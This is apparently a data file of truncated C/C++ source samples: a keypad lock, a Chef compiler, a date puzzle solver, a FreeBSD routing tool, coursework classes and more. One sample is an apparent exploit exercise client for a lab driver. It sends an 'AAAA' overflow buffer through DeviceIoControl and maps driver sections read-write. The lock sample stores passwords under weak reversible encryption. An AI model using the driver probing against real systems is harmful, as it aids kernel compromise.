Require current password verification only in set mode\r\n      lcd.clear();\r\n      lcd.print(mode ? \"+New PW (En-OLD)\" : \"Enter PW- Unlock\");\r\n      inputPassword = \"\"; // Reset password input\r\n    }\r\n    delay(100); // Debounce delay\r\n  }\r\n  lastButtonState = currentButtonState;\r\n\r\n  char key = keypad.getKey();\r\n  if (key) {\r\n    digitalWrite(ledPin, HIGH);\r\n    delay(50);\r\n    digitalWrite(ledPin, LOW);\r\n    delay(50);  \r\n    if (key == '#') {\r\n      if (mode) {\r\n        if (verifyCurrentPassword) {\r\n          // Check current password\r\n          String storedPassword = \"\";\r\n          for (int i = 0; EEPROM.read(i) != '\\0'; i++) {\r\n            char c = EEPROM.read(i);\r\n            storedPassword += encryptDecrypt(c, i);\r\n          }\r\n          if (storedPassword == inputPassword) {\r\n            lcd.clear();\r\n            lcd.print(\"Enter New PW\");\r\n            verifyCurrentPassword = false; // Current password verified, next input will be new password\r\n          } else {\r\n            lcd.clear();\r\n            lcd.print(\"Incorrect PW\");\r\n            delay(2000);\r\n            lcd.clear();\r\n            lcd.print(\"Enter Curr PW\");\r\n          }\r\n        } else {\r\n          // Set new password\r\n          for (int i = 0; i < inputPassword.length(); i++) {\r\n            char encryptedChar = encryptDecrypt(inputPassword[i], i);\r\n            EEPROM.write(i, encryptedChar);\r\n          }\r\n          EEPROM.write(inputPassword.length(), '\\0'); // Null terminator\r\n          lcd.clear();\r\n          lcd.print(\"Password Set\");\r\n          lcd.setCursor(0, 1);\r\n          lcd.print(\"Successfully\");\r\n        }\r\n      } else {\r\n        // Retrieve and decrypt stored password\r\n        String storedPassword = \"\";\r\n        for (int i = 0; EEPROM.read(i) != '\\0'; i++) {\r\n          char c = EEPROM.read(i);\r\n          storedPassword += encryptDecrypt(c, i);\r\n        }\r\n        // Compare stored password with input\r\n        lcd.clear();\r\n        if (storedPassword == inputPassword) {\r\n          lcd.print(\"Access Granted\");\r\n          digitalWrite(ledPin, HIGH);\r\n        } else {\r\n          lcd.print(\"Access Denied\");\r\n        }\r\n      }\r\n      delay(2000); // Display message for 2 seconds\r\n      lcd.clear();\r\n      lcd.print(mode ? \"Enter New PW\" : \"Enter PW- Unlock\");\r\n      inputPassword = \"\"; // Reset password input\r\n    } else {\r\n      inputPassword += key;\r\n      // Display asterisks for input\r\n      String displayPassword = \"\";\r\n      for (unsigned int i = 0; i < inputPassword.length(); i++) {\r\n        displayPassword += \"*\";\r\n      }\r\n      lcd.setCursor(0, 1);\r\n      lcd.print(displayPassword);\r\n    }\r\n  }\r\n}",
    "//\n//  History.cpp\n//  CS 32\n//\n//  Created by Katherine on 1/10/24.\n//\n\n#include \"History.h\"\n#include \"City.h\"\n\n#include <iostream>\n#include <string>\n#include <random>\n#include <utility>\n#include <cstdlib>\nusing namespace std;\n\n\n\nHistory::History(int nRows, int nCols) : m_row(nRows), m_col(nCols)\n{\n    for (int i = 0; i < m_row; i++){\n        for (int j = 0; j < m_col; j++){\n            m_grids[i][j] = '.';\n        }\n    }\n}\n\nint History::row(){\n    return m_row;\n}\n\nint History::col(){\n    return m_col;\n}\n\nbool History::record(int r, int c){\n    if (r >= 1  &&  r <= row()  &&  c >= 1  &&  c <= col()){\n        if (m_grids[r-1][c-1] == '.'){\n            m_grids[r-1][c-1] = 'A';\n        }else if(m_grids[r-1][c-1]=='Z'){\n            m_grids[r-1][c-1] = 'Z';\n        }else{\n            m_grids[r-1][c-1]++;\n        }\n        \n        return true;\n         // Invalid position\n    }\n    \n    // Increment the history count at the specified position\n    else{\n        return false;\n    }\n}\n   \nvoid History::display() const{\n    clearScreen();\n    for (int i = 0; i < m_row; i++){\n        for (int j = 0; j < m_col; j++){\n            cout << m_grids[i][j];\n        }\n        cout <<endl;\n    }\n    cout <<endl;\n}\n",
    "/*\n  Copyright (c) 2024, Rehan Ali\n  All rights reserved.\n\n  This source code is licensed under the BSD-style license found in the\n  LICENSE file in the root directory of this source tree.\n*/\n\n#include \"core.h\"\n\n#include <fstream>\n#include <algorithm>\n#include <filesystem>\n\nnamespace fs = std::filesystem;\n\nnamespace chefc {\n    namespace core {\n        Compiler::Compiler(args::Parser& parser)\n        {\n            std::cout << \"[INFO]: \" << \"Setting up initial flags and values.\" << \"\\n\";\n            \n            if (setupCommandLine(parser) == -1) exit(-1);\n\n            m_fileName = parser.getArg(\"programName\");\n            m_debuggingEnabled = parser.getFlag(\"enable_debugging\");\n            if (m_debuggingEnabled)\n                std::cout << \"[DEBUG]: \" << \"Debugging is now enabled! Verbosity increased.\" << \"\\n\";\n        }\n\n        int Compiler::setupCommandLine(args::Parser& parser)\n        {\n            parser.addArgument(\"programName\");\n            parser.addOptions<chefc::args::Flag>({\n                { \"enable_debugging\", chefc::args::Flag {\"W1\", \"warning_1\", \"Enables debugging for the robot.\"} }\n            });\n\n            int result = parser.parse();\n            return result;\n        }\n\n        int Compiler::preprocessFile()\n        {\n            std::ifstream fileStream{m_fileName};\n            if (!fileStream.is_open()) {\n                std::cout << \"[ERROR]: \" << \"Unable to open \" << m_fileName << \"!\";\n                std::cout << \" \" << \"Exiting.\" << \"\\n\";\n                return -1;\n            }\n\n            std::vector<std::string> vec;\n            for (std::string temp; std::getline(fileStream, temp);) {\n                vec.push_back(temp);\n            }\n\n            std::string joinedLines = lexer::utils::joinLines(vec, ';');\n            lexer::utils::replace(joinedLines, \";;\", \";\");\n            preprocessedLines = lexer::utils::split(joinedLines, ';');\n\n            auto it = std::find(preprocessedLines.begin() + 1, preprocessedLines.end(), \"Ingredients.\");\n            if (it == preprocessedLines.end()) {\n                fs::path absolutePath = fs::current_path() / fs::path{m_fileName};\n                std::cout << \"\\033[\" << \"1;31m\";\n                std::cout << absolutePath.string() << \"(1,0)\" << \": \";\n                std::cout << \"Syntax Error: INGREDIENTS data sector is missing.\" << \" \";\n                std::cout << \"Please check if it was spelled correctly and marked with a full stop.\" << \"\\n\";\n                std::cout << \"\\033[m\";\n            } else {\n                preprocessedLines.erase(preprocessedLines.begin() + 1, it);\n            }\n\n            return 0;\n        }\n    }\n}",
    "#include<bits/stdc++.h>\n#include<iostream>\n#include <fstream>\n#include<map>\n#include<set>\nusing namespace std;\n\n#define RESET \"\\033[0m\"\n#define RED \"\\033[38;5;197m\"\n#define YELLOW \"\\033[33m\"\n#define ORANGE \"\\033[38;5;208m\"  \n#define DARKPINK \"\\033[38;5;205m\"  \n#define LIGHTBLUE \"\\033[38;5;153m\"\n#define DARKBLUE \"\\033[34m\"\n#define GREEN \"\\033[32m\"\n#define VIOLET \"\\033[38;5;129m\" \n#define BLACK \"\\033[30m\"\n\nclass Piece {\n    private: \n        vector< vector<string> > allVariation;\n        vector< vector<string> > allInvertedVariation;\n\n        vector<string> getInvertedPiece(vector<string> &piece){\n            vector<string> invertedPiece = piece ;\n            for(int i=0; i<invertedPiece.size(); i++){\n                reverse(invertedPiece[i].begin(), invertedPiece[i].end());\n            }\n            return invertedPiece;\n        }\n\n        vector<string> rotatePieceClockwise(vector<string> piece, int numberOfRotations){\n            while(numberOfRotations--){\n                for(int i=0; i<piece.size(); i++){\n                    for(int j=0; j<i; j++){\n                        swap(piece[i][j], piece[j][i]) ;\n                    }\n                }\n\n                for(int i=0; i<piece.size(); i++){\n                    reverse(piece[i].begin(), piece[i].end());\n                }\n            }\n            return piece;\n        }\n\n    public:\n        Piece(vector<string> &piece) {\n            for(int rotateCount=0; rotateCount<=3; rotateCount++){\n                allVariation.push_back(rotatePieceClockwise(piece, rotateCount));\n            }\n            vector<string> invertedPiece = getInvertedPiece(piece);\n\n            for(int rotateCount=0; rotateCount<=3; rotateCount++){\n                allInvertedVariation.push_back(rotatePieceClockwise(invertedPiece, rotateCount));\n            }\n        }\n\n        vector<string> getPiece(int index){\n            if (index >= allVariation.size()) return {};\n            return allVariation[index];\n        }\n\n        vector<string> getInvertedPiece(int index){\n            if (index >= allInvertedVariation.size()) return {};\n            return allInvertedVariation[index];\n        }\n\n        void printPiece() {\n            for(int i=0; i<4; i++){\n                vector<string> temp = this->getPiece(i);\n                for(auto x: temp) {\n                    for(auto z:x) cout<<z<<\" \" ;\n                    cout<<endl; \n                }\n                cout<<endl<<endl; \n            }\n\n            for(int i=0; i<4; i++){\n                vector<string> temp = this->getInvertedPiece(i);\n                for(auto x: temp) {\n                    for(auto z:x) cout<<z<<\" \" ;\n                    cout<<endl; \n                }\n                cout<<endl<<endl;  \n            }\n        }\n\n};\n\nclass Board {\n    private:\n        map<string, pair<int,int> > valueToSquareMap; \n        vector<Piece*> pieces;\n        string month;\n        string date;\n        char NOT_ALLOWED_SQUARE = '*';\n        char ALLOWED_SQUARE = '.';\n        int MASK;\n        bool soultionFound = false;\n\n        vector<string> board = {\n            \"****************\",\n            \"****......******\",\n            \"****......******\",\n            \"****.......*****\",\n            \"****.......*****\",\n            \"****.......*****\",\n            \"****.......*****\",\n            \"****...*********\",\n            \"****************\",\n        };\n        \n        void markRequiredDates(string month, string date, char ch) {\n            pair<int,int> monthIndex = valueToSquareMap[month];\n            pair<int,int> dateIndex = valueToSquareMap[date];\n            board[monthIndex.first][monthIndex.second] = ch;\n            board[dateIndex.first][dateIndex.second] = ch;\n        }\n\n        void printSquare(int size) {\n            for (int i = 0; i < size; ++i) {\n                for (int j = 0; j < size; ++j) {\n                    cout << \"\\u2588\";\n                }\n            }\n        }\n\n        void fillValueToSquareMap(){\n            map<string, pair<int,int> > M;\n            M[\"jan\"] = make_pair(1,4), M[\"feb\"] = make_pair(1,5), M[\"mar\"] = make_pair(1,6), M[\"apr\"] = make_pair(1,7), M[\"may\"] = make_pair(1,8), M[\"jun\"] = make_pair(1,9);\n            M[\"jul\"] = make_pair(2,4), M[\"aug\"] = make_pair(2,5), M[\"sep\"] = make_pair(2,6), M[\"oct\"] = make_pair(2,7), M[\"nov\"] = make_pair(2,8); M[\"dec\"] = make_pair(2,9);\n            M[\"1\"] = make_pair(3,4), M[\"2\"] = make_pair(3,5), M[\"3\"] = make_pair(3,6), M[\"4\"] = make_pair(3,7), M[\"5\"] = make_pair(3,8), M[\"6\"] = make_pair(3,9), M[\"7\"] = make_pair(3,10);\n            M[\"8\"] = make_pair(4,4), M[\"9\"] = make_pair(4,5), M[\"10\"] = make_pair(4,6), M[\"11\"] = make_pair(4,7); M[\"12\"] = make_pair(4,8), M[\"13\"] = make_pair(4,9), M[\"14\"] = make_pair(4,10);\n            M[\"15\"] = make_pair(5,4), M[\"16\"] = make_pair(5,5), M[\"17\"] = make_pair(5,6), M[\"18\"] = make_pair(5,7), M[\"19\"] = make_pair(5,8), M[\"20\"] = make_pair(5,9), M[\"21\"] = make_pair(5,10);\n            M[\"22\"] = make_pair(6,4), M[\"23\"] = make_pair(6,5), M[\"24\"] =",
    "#include <algorithm>\n#include <cstdio>\n#include <iostream>\n#include <vector>\n#include <sstream>\n#include <charconv>\n#include <tuple>\n#include <map>\n\n#include <arpa/inet.h>\n#include <net/if.h>\n#include <net/if_dl.h>\n#include <netinet/in.h>\n#include <sys/sysctl.h>\n#include <sys/socket.h>\n#include <sys/param.h>\n#include <sys/module.h>\n#include <sys/linker.h>\n#include <sys/types.h>\n\n#include <netlink/netlink.h>\n#include <netlink/route/interface.h>\n#include <netlink/route/common.h>\n\n#include <netlink/netlink_snl_route.h>\n#include <netlink/netlink_snl_route_parsers.h>\n#include <netlink/netlink_snl_route_compat.h>\n\n#include \"fibmgr.hpp\"\n\n// from /usr.bin/netstat/common.h\nstruct ifmap_entry {\n\tstd::string ifname;\n\tuint32_t mtu;\n\tuint32_t index;\n};\n\nstd::map<uint32_t, ifmap_entry> ifmap;\n\nstruct routing_entry\n{\n\tsockaddr_storage destination;\n\tsockaddr_dl gateway;\n\tuint8_t mask;\n\tint flags;\n\tuint32_t mtu;\n\tuint32_t weight;\n};\n\nstruct add_later_entry\n{\n\trouting_entry rtenty;\n\tint fib;\n};\n\nrouting_entry default_entries[6] = {};\nstd::vector<add_later_entry> entries_add_later;\nint lo0_index = 0;\n\n// first: valid, second: invalid\nstd::tuple<std::set<int>, std::vector<std::string>, bool>\nfind_fibnum(const std::string &str, int fib_total);\n\nstd::vector<int> all_fibs(int fib_total);\n\nstd::string sockaddr_to_string(sockaddr_in *addr);\nstd::string sockaddr_to_string(sockaddr_in6 *addr);\nstd::string sockaddr_to_string(sockaddr_storage *addr);\nstd::string sockaddr_to_string(sockaddr *addr);\nvoid copy_sockaddr(void *src, void *dst);\n\n// orginally from /sbin/route/route_netlink.c: nl_init_socket\nbool\nnl_init_socket(struct snl_state *ss);\n\nstruct nl_helper\n{\n\tbool init()\n\t{\n\t\tinit_success = nl_init_socket(&state);\n\t\treturn init_success;\n\t}\n\n\t~nl_helper()\n\t{\n\t\tif (init_success)\n\t\t\tsnl_free(&state);\n\t}\n\n\tsnl_state state = {};\n\nprivate:\n\tbool init_success = false;\n};\n\nbool\nnl_init_socket(struct snl_state *ss)\n{\n\tif (snl_init(ss, NETLINK_ROUTE))\n\t\treturn true;\n\n\tif (modfind(\"netlink\") == -1 && errno == ENOENT) {\n\t\t/* Try to load */\n\t\tif (kldload(\"netlink\") == -1)\n\t\t\tstd::cerr << \"netlink is not loaded and load attempt failed\\n\";\n\t\tif (snl_init(ss, NETLINK_ROUTE))\n\t\t\treturn true;\n\t}\n\n\tstd::cerr << \"unable to open netlink socket\\n\";\n\treturn false;\n}\n\nvoid add_defaults(int fibnum);\nvoid try_add_again();\nbool dependency_checker(add_later_entry &second_entry, add_later_entry &first_entry);\nvoid nl_ops(int cmd, int fib, snl_parsed_route &rt);\n\n// orginally from /usr.bin/netstat/route_netlink.c: p_rtable_netlink\nbool\nrouting_table_netlink_ops(int fibnum, int af, action_t action, const std::vector<int> &other_fibs = {});\n\n// orginally from /usr.bin/netstat/route_netlink.c: prepare_ifmap_netlink\nstd::map<uint32_t, ifmap_entry>\nprepare_ifmap_netlink(struct snl_state *ss);\n\n// orginally from /usr.bin/netstat/route_netlink.c: p_rtentry_netlink\nvoid\nrouting_table_entry_netlink_ops(int cmd, const std::vector<int> &other_fib,\n                                struct snl_state *ss, struct nlmsghdr *hdr);\n\n// orginally from /sbin/route/route_netlink.c: rtmsg_nl\nint\nrtmsg_nl(int cmd, int rtm_flags, int fib,\n         struct sockaddr *dst, uint8_t mask, struct sockaddr *gw, u_long rmx_mtu, u_long rmx_weight);\n\n// orginally from /sbin/route/route_netlink.c: rtmsg_nl_int\nint\nrtmsg_nl_int(struct snl_state *ss, int cmd, int rtm_flags, int fib,\n             struct sockaddr *dst, uint8_t mask, struct sockaddr *gw,\n             u_long rmx_mtu, u_long rmx_weight);\n\nint\nrtmsg_nl_int(struct snl_state *ss, int cmd, int rtm_flags, int fib,\n             struct sockaddr *dst, uint8_t mask, struct sockaddr *gw,\n             u_long rmx_mtu, u_long rmx_weight)\n{\n\tstruct snl_writer nw;\n\tint nl_type = 0, nl_flags = 0;\n\n\tsnl_init_writer(ss, &nw);\n\n\tswitch (cmd) {\n\tcase RTSOCK_RTM_ADD:\n\t\tnl_type = RTM_NEWROUTE;\n\t\tnl_flags = NLM_F_CREATE | NLM_F_APPEND; /* Do append by default */\n\t\tbreak;\n\tcase RTSOCK_RTM_CHANGE:\n\t\tnl_type = RTM_NEWROUTE;\n\t\tnl_flags = NLM_F_REPLACE;\n\t\tbreak;\n\tcase RTSOCK_RTM_DELETE:\n\t\tnl_type = RTM_DELROUTE;\n\t\tbreak;\n\tdefault:\n\t\treturn (EINVAL);\n\t}\n\n\tif (dst == NULL)\n\t\treturn (EINVAL);\n\n\tstruct nlmsghdr *hdr = snl_create_msg_request(&nw, nl_type);\n\thdr->nlmsg_flags |= nl_flags;\n\n\tint plen = 0;\n\tint rtm_type = RTN_UNICAST;\n\n\tswitch (dst->sa_family) {\n\tcase AF_INET:\n\t{\n\t\tif ((rtm_flags & RTF_HOST) == 0)\n\t\t\tplen = mask;\n\t\telse\n\t\t\tplen = 32;\n\t\tbreak;\n\t}\n\tcase AF_INET6:\n\t{\n\t\tif ((rtm_flags & RTF_HOST) == 0)\n\t\t\tplen = mask;\n\t\telse\n\t\t\tplen = 128;\n\t\tbreak;\n\t}\n\tdefault:\n\n\t\treturn (ENOTSUP);\n\t}\n\n\tif (rtm_flags & RTF_REJECT)\n\t\trtm_type = RTN_PROHIBIT;\n\telse if (rtm_flags & RTF_BLACKHOLE)\n\t\trtm_type = RTN_BLACKHOLE;\n\n\tstruct rtmsg *rtm = snl_reserve_msg_object(&nw, struct rtmsg);\n\trtm->rtm_family = dst->sa_family;\n\trtm->rtm_protocol = RTPROT_STATIC;\n\trtm->rtm_type = rtm_type;\n\trtm->rtm_dst_len = plen;\n\n\t/* Request exact prefix match if mask is set */\n\tif (cmd == RTSOCK_RTM_GET)\n\t\trtm->rtm_flags = RTM_F_PREFIX;\n\n\tsnl_add_msg_attr_ip(&nw, RTA_DST, dst);\n\tsnl_add_msg_attr_u32(",
    "#include <iostream>\n#include <string>\n\n#include \"Driver.h\"\n#include <ntstatus.h>\n\n\ntypedef NTSTATUS(NTAPI* FuncTy_NtMapViewOfSection)(\n    HANDLE          SectionHandle,\n    HANDLE          ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR       ZeroBits,\n    SIZE_T          CommitSize,\n    PLARGE_INTEGER  SectionOffset,\n    PSIZE_T         ViewSize,\n    DWORD           InheritDisposition,\n    ULONG           AllocationType,\n    ULONG           Win32Protect\n    );\n\n#define NT_PROXY_BODY(name, ...)\\\n    static FuncTy_##name lpfn##name = NULL;\\\n    if (lpfn##name == NULL) {\\\n        lpfn##name = (FuncTy_##name)GetProcAddress(\\\n            LoadLibraryW(L\"ntdll.dll\"), #name\\\n        );\\\n    }\\\n    return lpfn##name(\\\n        __VA_ARGS__\\\n    )\n\nNTSTATUS My_NtMapViewOfSection(\n    HANDLE          SectionHandle,\n    HANDLE          ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR       ZeroBits,\n    SIZE_T          CommitSize,\n    PLARGE_INTEGER  SectionOffset,\n    PSIZE_T         ViewSize,\n    DWORD           InheritDisposition,\n    ULONG           AllocationType,\n    ULONG           Win32Protect\n) {\n    NT_PROXY_BODY(\n        NtMapViewOfSection,\n        SectionHandle,\n        ProcessHandle,\n        BaseAddress,\n        ZeroBits,\n        CommitSize,\n        SectionOffset,\n        ViewSize,\n        InheritDisposition,\n        AllocationType,\n        Win32Protect\n    );\n}\n\n\n// copy-pasted https://stackoverflow.com/questions/29242/off-the-shelf-c-hex-dump-code\nvoid hexdump(void* ptr, int buflen) {\n    unsigned char* buf = (unsigned char*)ptr;\n    int i, j;\n    for (i = 0; i < buflen; i += 16) {\n        printf(\"%06x: \", i);\n        for (j = 0; j < 16; j++)\n            if (i + j < buflen)\n                printf(\"%02x \", buf[i + j]);\n            else\n                printf(\"   \");\n        printf(\" \");\n        for (j = 0; j < 16; j++)\n            if (i + j < buflen)\n                printf(\"%c\", isprint(buf[i + j]) ? buf[i + j] : '.');\n        printf(\"\\n\");\n    }\n};\n\n\nint main()\n{\n    std::wcout << L\"vrdrv clt 1.0 (c) immortalp0ny @ ESC-VR\" << std::endl;\n\n    HANDLE hDevice = CreateFileW(L\"\\\\??\\\\vrdev\",\n        GENERIC_READ | GENERIC_WRITE,\n        FILE_SHARE_READ,\n        NULL,\n        OPEN_EXISTING,\n        FILE_ATTRIBUTE_NORMAL,\n        NULL);\n\n    if (hDevice == INVALID_HANDLE_VALUE) {\n        std::wcout << L\"[~] bad device handle. Is it available ? err=\" << GetLastError() << std::endl;\n        return -1;\n    }\n\n    DeviceRequestPing  ping;\n    DevicePingResponse pong = { 0 };\n\n    wchar_t overflowMessage[16] = L\"AAAAAAAAAAAAAAA\";\n\n    memcpy(ping.message, overflowMessage, sizeof(overflowMessage));\n\n    //wcscpy_s(ping.message, VR_PING);\n\n    DWORD bytes = NULL;\n\n    BOOL status = DeviceIoControl(\n        hDevice,\n        IOCTL_CODE_VR_PING,\n        &ping,\n        sizeof(DeviceRequestPing),\n        nullptr,\n        0,\n        &bytes,\n        NULL\n    );\n    if (!status) {\n        std::wcout << L\"[~] DeviceIoControl() failed. err=\" << GetLastError() << std::endl;\n        return -2;\n    }\n\n    std::wcout << L\"[+] vrdrv response: \" << pong.message << std::endl;\n\n    DeviceInitRequest         initreq = { 0 };\n    DeviceInitRequestResponse initresp = { 0 };\n\n    initreq.szSectionIn = 0x1000;\n    initreq.szSectionOut = 0x1000;\n\n    DeviceIoControl(\n        hDevice,\n        IOCTL_CODE_VR_INIT,\n        &initreq,\n        sizeof(DeviceInitRequest),\n        &initresp,\n        sizeof(DeviceInitRequestResponse),\n        &bytes,\n        NULL\n    );\n\n    std::wcout << L\"[+] vrdrv in=\" << std::hex << initresp.hSectionIn << L\" vrdrv out=\" << std::hex << initresp.hSectionOut << std::endl;\n\n    PVOID  lpMappedSectionIn = NULL;\n    SIZE_T szMappedSectionIn = NULL;\n\n    NTSTATUS viewStatus = My_NtMapViewOfSection(\n        initresp.hSectionIn,\n        GetCurrentProcess(),\n        &lpMappedSectionIn,\n        NULL,\n        NULL,\n        NULL,\n        &szMappedSectionIn,\n        2, // ViewUnmap \n        NULL,\n        PAGE_READWRITE\n    );\n    if (viewStatus < 0) {\n        std::wcout << L\"[~] NtMapViewOfSection() failed. err=\" << GetLastError() << \" status=\" << std::hex << viewStatus << std::endl;\n        return -3;\n    }\n\n    std::wcout << \"[+] lpMappedSectionIn: \" << lpMappedSectionIn << std::endl;\n\n    PVOID  lpMappedSectionOut = NULL;\n    SIZE_T szMappedSectionOut = NULL;\n\n    std::wcout << \"[+] lpMappedSectionOut: \" << lpMappedSectionOut << std::endl;\n\n    viewStatus = My_NtMapViewOfSection(\n        initresp.hSectionOut,\n        GetCurrentProcess(),\n        &lpMappedSectionOut,\n        NULL,\n        NULL,\n        NULL,\n        &szMappedSectionOut,\n        2, // ViewUnmap \n        NULL,\n        PAGE_READWRITE\n    );\n    if (viewStatus < 0) {\n        std::wcout << L\"[~] NtMapViewOfSection() failed. err=\" << GetLastError() << \" status=\" << std::hex << viewStatus << std::endl;\n        return -3;\n    }\n\n    DeviceCacheEntries* lpEntries = (DeviceCacheEntries*)(lpMappedSectionIn);\n    lpEntries->count = 1;\n\n    DeviceCacheSetData* csde",
    "#include <iostream>\r\n#include <string>\r\nenum types { Nor = 0, And = 1, Or = 2, Xor = 3, flip = 5, nand = 10};\r\nchar objects[30000];\r\nint currentfreespace = 0;\r\nint currentindex = 1;\r\nshort currentfreespaceinarray = 0;\r\nbool wired = true;\r\nstruct block {\r\n    block()\r\n        :x(0), y(0), z(0), is_on(0), type(0), index(currentindex), hasconsecutiveblock(true), hasconsecutiveblockrepresenter(\"\\0\")\r\n    {\r\n        currentindex += 1;\r\n    }\r\n    short x, y, z, is_on; // please keep your values between -32 768 and 32 767 since otherwise they will overflow\r\n    short type;\r\n    int index;\r\n    bool hasconsecutiveblock;\r\n\r\nprivate:\r\n    std::string hasconsecutiveblockrepresenter;\r\npublic:\r\n    void create() {\r\n        hasconsecutiveblockrepresenter = hasconsecutiveblock ? hasconsecutiveblockrepresenter = \";\" : hasconsecutiveblockrepresenter = \"\\0\";\r\n        std::string mainstring = std::to_string(type) + std::string(\",\") + std::to_string(is_on) + std::string(\",\") + std::to_string(x) + std::string(\",\") + std::to_string(y) + std::string(\",\") + std::to_string(z) + std::string(\",\");\r\n        for (int i = 0; i < mainstring.size(); i++) {\r\n            objects[currentfreespace] = mainstring[i];\r\n            currentfreespace++;\r\n        }\r\n        if (type == flip && is_on == 1 && !wired) {\r\n            objects[currentfreespace] = '2';\r\n            objects[currentfreespace + 1] = '+';\r\n            objects[currentfreespace + 2] = '0';\r\n            currentfreespace += 3;\r\n        }\r\n        if (type == flip && is_on == 0 && wired) {\r\n            objects[currentfreespace] = '0';\r\n            objects[currentfreespace + 1] = '+';\r\n            objects[currentfreespace + 2] = '0';\r\n            currentfreespace += 4;\r\n        }\r\n        if (type == flip && is_on == 1 && wired) {\r\n            objects[currentfreespace] = '2';\r\n            objects[currentfreespace + 1] = '+';\r\n            objects[currentfreespace + 2] = '0';\r\n            currentfreespace += 4;\r\n        }\r\n        if (type == flip && is_on == 0 && !wired) {\r\n            objects[currentfreespace] = '0';\r\n            objects[currentfreespace + 1] = '+';\r\n            objects[currentfreespace + 2] = '0';\r\n            currentfreespace += 3;\r\n        }\r\n        if (!hasconsecutiveblock && !wired) {\r\n            for (int i = 0; i < 3; i++) {\r\n                objects[currentfreespace] = '?';\r\n                currentfreespace += 1;\r\n            }\r\n        }\r\n      for(int i = 0; i < hasconsecutiveblockrepresenter.size(); i++){\r\n        objects[currentfreespace] = hasconsecutiveblockrepresenter[i];\r\n        currentfreespace++;\r\n      }\r\n    }\r\n};\r\nvoid createwire(block a, block b, bool hasmorewires, bool is_starting_wire, bool is_ending_wire) {\r\n    std::string index1 = std::to_string(a.index);\r\n    std::string index2 = std::to_string(b.index);\r\n    if (hasmorewires == false) {\r\n        objects[currentfreespace] = '?';\r\n        if (index1.size() >= index2.size()) {\r\n            for (int i = 0; i < index1.size(); i++) {\r\n                objects[currentfreespace + 1 + i] = index1[i];\r\n                if (i < index2.size()) {\r\n                    objects[currentfreespace + 2 + i + index1.size()] = index2[i];\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            for (int i = 0; i < index2.size(); i++) {\r\n                objects[currentfreespace + 1 + i] = index2[i];\r\n                if (i < index1.size()) {\r\n                    objects[currentfreespace + 2 + i + index2.size()] = index1[i];\r\n                }\r\n            }\r\n        }\r\n        objects[currentfreespace + index1.size() + index2.size()] = ',';\r\n        objects[currentfreespace + index1.size() + index2.size() + 2] = '?';\r\n        objects[currentfreespace + index1.size() + index2.size() + 3] = '?';\r\n        currentfreespace += index1.size() + (index2.size() * 2) + 4;\r\n        return;\r\n    }\r\n    if (is_starting_wire == true) {\r\n        objects[currentfreespace] = '?';\r\n        if (index1.size() >= index2.size()) {\r\n            for (int i = 0; i < index1.size(); i++) {\r\n                objects[currentfreespace + 1 + i] = index1[i];\r\n                if (i < index2.size()) {\r\n                    objects[currentfreespace + 2 + i + index1.size()] = index2[i];\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            for (int i = 0; i < index2.size(); i++) {\r\n                objects[currentfreespace + 1 + i] = index2[i];\r\n                if (i < index1.size()) {\r\n                    objects[currentfreespace + 2 + i + index2.size()] = index1[i];\r\n                }\r\n            }\r\n        }\r\n        objects[currentfreespace + index1.size() + index2.size()] = ',';\r\n        objects[currentfreespace + index1.size() + index2.size() + 2] = ';';\r\n        currentfreespace += index1.size() + index2.size() + 3;\r\n        return;\r\n    }\r\n    if (is_ending_wire == true) {\r\n        if (index1.size() >= index2.size()) {\r\n            for (int i = 0; i < index1.size(); i++) {\r\n                objects[current",
    "#include \"Compagnie.h\"\n\nCompagnie::Compagnie(const string &nom) : nom_(nom), chiffreAffaires_(0) {}\n\nCompagnie ::~Compagnie() = default;\n\nvector<shared_ptr<Produit>> Compagnie::getProduits() const\n{\n    return produits_;\n}\nvector<shared_ptr<Client>> Compagnie::getClients() const\n{\n    return clients_;\n}\nvector<shared_ptr<Fournisseur>> Compagnie::getFournisseurs() const\n{\n    return fournisseurs_;\n}\nmap<shared_ptr<Produit>, int> Compagnie::getProduitsAchetes() const\n{\n    return produitsAchetes_;\n}\nvoid Compagnie::operator+(const shared_ptr<Client> &client)\n{\n    if (chercherClient(client))\n        return;\n    clients_.push_back(client);\n}\n// to do TP4\nvoid Compagnie::operator+(const shared_ptr<Fournisseur> &fournisseur)\n{\n    auto it = find_if(fournisseurs_.begin(), fournisseurs_.end(), [&](const auto &f)\n                      { return fournisseur == f; });\n    if (it != fournisseurs_.end())\n    {\n        return;\n    }\n    fournisseurs_.push_back(fournisseur);\n\n    for (const auto &produit : fournisseur->getCatalogue())\n    {\n        produitsTrierPrix_.insert(produit);\n        if (!chercherProduit(produit))\n        {\n            produits_.push_back(produit);\n        }\n    }\n}\n\nvoid Compagnie::operator-(const shared_ptr<Client> &client)\n{\n    for (int i = 0; i < clients_.size(); i++)\n        if (clients_[i] == client)\n        {\n            clients_[i] = clients_.back();\n            clients_.pop_back();\n            return;\n        }\n    return;\n}\nvoid Compagnie::operator-(const shared_ptr<Fournisseur> &fournisseur)\n{\n    for (int i = 0; i < fournisseurs_.size(); i++)\n        if (fournisseurs_[i] == fournisseur)\n        {\n            fournisseurs_[i] = fournisseurs_.back();\n            fournisseurs_.pop_back();\n            break;\n        }\n    for (int i = 0; i < produits_.size(); i++)\n        if (produits_[i]->getFournisseur() == fournisseur.get())\n        {   // chercher   de produits_[i]  dans le set\n            // TO DO TP4. Il est interdit de faire une boucle\n            // il faut supprimer tous  les produits associ\u00e9s \u00e0 ce  fournisseur\n            produitsTrierPrix_.erase(produits_[i]);\n            swap(produits_[i], produits_.back());\n            produits_.pop_back();\n        }\n    return;\n}\n// TO DO TP4. Il est interdit de faire une boucle\nostream &Compagnie::afficher(ostream &sortie) const\n{\n    for_each(produits_.begin(), produits_.end(), [&sortie](const auto &p)\n             { p->afficher(sortie); });\n    for_each(clients_.begin(), clients_.end(), [&sortie](const auto &c)\n             { c->afficher(sortie); });\n    for_each(fournisseurs_.begin(), fournisseurs_.end(), [&sortie](const auto &f)\n             { f->afficher(sortie); });\n\n    return sortie;\n}\n\ndouble Compagnie::getChiffreAffaires() const\n{\n    return chiffreAffaires_;\n}\n// TO DO TP4. Il est interdit de faire une boucle\nvoid Compagnie::livrer(const shared_ptr<Client> &client)\n{\n    chiffreAffaires_ += client->getCoutPanier();\n    clientsChiffreAffaires_.insert(make_pair(client, client->getCoutPanier()));\n\n    for (const auto &p : client->getPanier()->getContenuPanier())\n    {\n        produitsAchetes_[p]++;\n    